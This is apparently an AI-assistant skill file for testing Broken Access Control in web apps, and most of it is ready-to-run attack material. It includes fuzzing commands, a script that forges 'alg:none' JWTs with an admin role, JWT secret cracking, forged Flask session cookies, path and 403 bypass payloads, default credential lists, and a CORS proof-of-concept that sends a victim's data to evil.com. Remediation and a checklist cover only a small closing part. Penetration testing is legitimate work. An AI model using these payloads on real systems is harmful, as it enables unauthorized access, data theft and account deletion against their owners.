---
name: bac
description: >
  Expert guidance for finding, exploiting, and remediating Broken Access Control (BAC)
  vulnerabilities — OWASP #1. Covers forced browsing, privilege escalation, path traversal,
  JWT manipulation, cookie tampering, admin panel exposure, HTTP method bypass, CORS
  misconfiguration, and insecure direct object reference (access control angle). Use this
  skill whenever the user mentions broken access control, privilege escalation, unauthorized
  access, forced browsing, admin bypass, JWT role tampering, missing authorization, CORS
  misconfiguration, horizontal/vertical privilege escalation, accessing restricted pages,
  or bypassing authentication checks. Also trigger for "how do I test access control",
  "bypass admin page", "escalate privileges in web app", "test JWT for privilege escalation",
  "CORS misconfiguration exploitation". Always use this skill for any authorization bypass
  or access control testing question.
---

# BAC Skill — Broken Access Control Testing

BAC (OWASP Top 10 #1) occurs when access restrictions aren't enforced — users can act outside
their intended permissions. Covers anything from missing auth checks to logic flaws.

---

## 1. Attack Surface Map — Start Here

| Scenario | Section |
|----------|---------|
| Forced browsing / unauthenticated access | §3.1 |
| Horizontal privilege escalation | §3.2 |
| Vertical privilege escalation | §3.3 |
| JWT / token manipulation | §3.4 |
| Cookie / session tampering | §3.5 |
| HTTP method bypass | §3.6 |
| Path / URL bypass tricks | §3.7 |
| Admin panel exposure | §3.8 |
| CORS misconfiguration | §3.9 |
| Feature-level access control flaws | §3.10 |
| Referer / Origin-based auth | §3.11 |

---

## 2. Core Concepts

- **Authentication** — Proves who you are.
- **Authorization** — Proves what you're allowed to do. BAC is an *authorization* failure.
- **Forced browsing** — Accessing URLs that aren't linked but exist on the server.
- **Privilege escalation** — Acting with higher permissions than granted.
- **Missing function-level access control** — Backend doesn't check role before executing action.

---

## 3. Attack Techniques

### 3.1 Forced Browsing / Unauthenticated Access

```bash
# Fuzz for hidden/admin paths without authentication
ffuf -u https://target.com/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,301,302,403 \
     -fc 404

# Common admin/privileged paths
/admin /administrator /admin.php /admin/login
/dashboard /manager /console /control-panel
/api/admin /api/internal /api/v1/admin
/users /users/list /accounts
/config /settings /setup /install
/backup /backup.zip /db.sql /.git
/actuator /actuator/env /actuator/heapdump   ← Spring Boot
/swagger-ui /swagger-ui.html /api-docs       ← API docs
```

---

### 3.2 Horizontal Privilege Escalation

```
# Access another user's resources at same privilege level
# (See full IDOR skill for deeper coverage)

GET /account/settings     →  Response contains your user_id
                          →  Try accessing: /account/1/settings (admin?)
                          →  Try another user's ID

# Multi-tenancy bypass
GET /org/acme/reports     →  Try /org/competitor/reports
GET /tenant/123/data      →  Try /tenant/124/data
```

---

### 3.3 Vertical Privilege Escalation

```
# Access admin/higher-privilege functions as low-privilege user

# Hidden admin links in HTML source
grep -iE "admin|dashboard|manage|console" page_source.html

# Direct access to admin endpoints
GET /admin/users
GET /admin/delete-user?id=5
POST /admin/set-role   {"user_id":1337,"role":"admin"}

# API admin endpoints
GET /api/v1/admin/stats
GET /api/v1/users?all=true
DELETE /api/v1/users/1338
```

---

### 3.4 JWT Manipulation

```bash
# Decode JWT (base64)
echo "PAYLOAD_PART" | base64 -d

# Common JWT attacks:

# 1. Algorithm: none (remove signature)
# Change header: {"alg":"none","typ":"JWT"}
# Remove signature (keep trailing dot)
python3 -c "
import base64, json
h = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
p = base64.b64encode(json.dumps({'user_id':1,'role':'admin','exp':9999999999}).encode()).rstrip(b'=')
print(h.decode() + '.' + p.decode() + '.')
"

# 2. RS256 → HS256 confusion
# Use the server's public key as HMAC secret
# Tools: jwt_tool, python-jwt

# 3. Modify payload claims
# Change: "role":"user" → "role":"admin"
# Change: "is_admin":false → true
# Change: "user_id":1337 → 1

# 4. Weak secret brute force
hashcat -a 0 -m 16500 eyJ...TOKEN... /usr/share/wordlists/rockyou.txt

# JWT Tool (all attacks)
python3 jwt_tool.py TOKEN -T          # tamper
python3 jwt_tool.py TOKEN -X a        # alg:none
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # crack
```

---

### 3.5 Cookie / Session Tampering

```
# Decode and modify session cookies
# Base64-encoded cookies
echo "dXNlcl9pZD0xMzM3O3JvbGU9dXNlcg==" | base64 -d
# → user_id=1337;role=user
# Modify: user_id=1;role=admin
echo -n "user_id=1;role=admin" | base64

# Flask session cookie (signed but sometimes weak secret)
flask-unsign --decode --cookie "SESSION-COOKIE"
flask-unsign --sign --cookie "{'user_id':1,'role':'admin'}" --secret 'weakpassword'

# Serialized session tampering (PHP, Ruby, Java)
# If cookie looks like serialized data, try deserialization attacks
```

---

### 3.6 HTTP Method Bypass

```
# App may enforce auth on GET but not other methods
GET  /admin/users   → 403
POST /admin/users   → 200?

# HTTP verb override headers
POST /admin/users
X-HTTP-Method-Override: GET
X-Method-Override: GET
X-Override-Method: GET
_method=GET  (in body)

# HEAD instead of GET (may bypass logging/auth in some apps)
HEAD /admin/export

# TRACE method (can leak auth headers via XST)
TRACE / HTTP/1.1
Host: target.com
```

---

### 3.7 Path / URL Bypass Tricks

```
# Capitalization
/Admin /ADMIN /aDmIn

# Path traversal into restricted area
/public/../admin/
/static/../../admin/

# Double encoding
/admin → /%61dmin → /%2561dmin

# Trailing slash / extension
/admin/ /admin.php /admin.html /admin.json

# Path parameter injection
/api/v1/users;admin=true
/admin;jsessionid=xxx
/api/admin%2fusers   (URL-encoded slash)
/api/v1/..%2fadmin%2fusers

# Spring / Nginx bypass
/api/v1/users/..;/admin/
/%2e%2e/admin/
```

---

### 3.8 Admin Panel Exposure

```bash
# Enumerate admin endpoints
ffuf -u https://target.com/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/AdminPanels.fuzz.txt \
     -mc 200,302

# Common default credentials to try on found panels
admin:admin  admin:password  admin:123456
root:root    administrator:admin   admin:admin123

# Framework-specific default paths
/wp-admin           WordPress
/administrator      Joomla
/admin/login.php    phpMyAdmin
/phpmyadmin
/manager/html       Tomcat
/jenkins
/solr/admin
/kibana
/grafana
```

---

### 3.9 CORS Misconfiguration

```bash
# Test 1: Reflect origin
curl -H "Origin: https://evil.com" \
     -H "Authorization: Bearer TOKEN" \
     "https://target.com/api/user/data" -v 2>&1 | grep -i "access-control"

# Vulnerable response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true

# Test 2: Null origin
curl -H "Origin: null" ...

# Test 3: Subdomain wildcard bypass
curl -H "Origin: https://evil.target.com" ...
curl -H "Origin: https://target.com.evil.com" ...

# Exploit: PoC HTML
<script>
fetch("https://target.com/api/user/data", {
  credentials: "include"
}).then(r => r.text()).then(d => {
  fetch("https://evil.com/steal?d=" + btoa(d));
});
</script>
```

---

### 3.10 Feature-Level Access Control

```
# Test every feature with lower-privilege account:
# - Can a "viewer" role call "edit" API?
# - Can a regular user access "export all data" function?
# - Can a deactivated account still make API calls?

# Check if UI hides buttons but API is unprotected:
# 1. Log in as low-priv user, note the token
# 2. Observe requests an admin makes (or guess from API docs)
# 3. Replay those requests with low-priv token

curl -X DELETE "https://target.com/api/users/1338" \
     -H "Authorization: Bearer LOW-PRIV-TOKEN"
```

---

### 3.11 Referer / Origin-Based Auth (Anti-pattern)

```
# Some apps check Referer header instead of session
GET /admin/action
Referer: https://target.com/admin/  ← spoof this

# Or check Origin for internal API calls
POST /internal/admin
Origin: https://target.com
X-Internal-Request: true
X-Forwarded-For: 127.0.0.1
```

---

## 4. Automated Testing

```bash
# Autorize (Burp extension) — best tool for BAC
# 1. Add low-priv cookie/token in Autorize config
# 2. Browse app as admin
# 3. Autorize auto-replays every request with low-priv creds
# 4. Flag: "Bypassed!" = access control failure

#403 bypass wordlist (path tricks)
ffuf -u "https://target.com/adminFUZZ" \
     -w /usr/share/seclists/Fuzzing/403-bypass.txt \
     -mc 200
```

---

## 5. Remediation

1. **Deny by default** — Reject access unless explicitly granted.
2. **Centralized authorization** — One access control library, not scattered inline checks.
3. **Server-side enforcement** — Never rely on hiding UI elements; always check server-side.
4. **Role-based checks on every function** — Not just navigation.
5. **Invalidate sessions properly** — On logout, role change, password change.
6. **Log all access control failures** — Alert on repeated failures.
7. **Test with automated tools** — Autorize, OWASP ZAP access control scanner.

---

## 6. BAC Testing Checklist

- [ ] Map all roles in the app (guest, user, moderator, admin, etc.)
- [ ] Create accounts for each role
- [ ] Test every endpoint with each role — document expected vs actual
- [ ] Try unauthenticated access to all authenticated endpoints
- [ ] Check JWT claims — tamper with role/admin/user_id fields
- [ ] Test HTTP method bypass on restricted endpoints
- [ ] Fuzz admin/hidden paths with wordlists
- [ ] Test CORS with `Origin: https://evil.com` + credentials
- [ ] Check for path bypass tricks (encoding, trailing slash, case)
- [ ] Verify deactivated/deleted accounts can't access the API
- [ ] Test multi-tenancy isolation
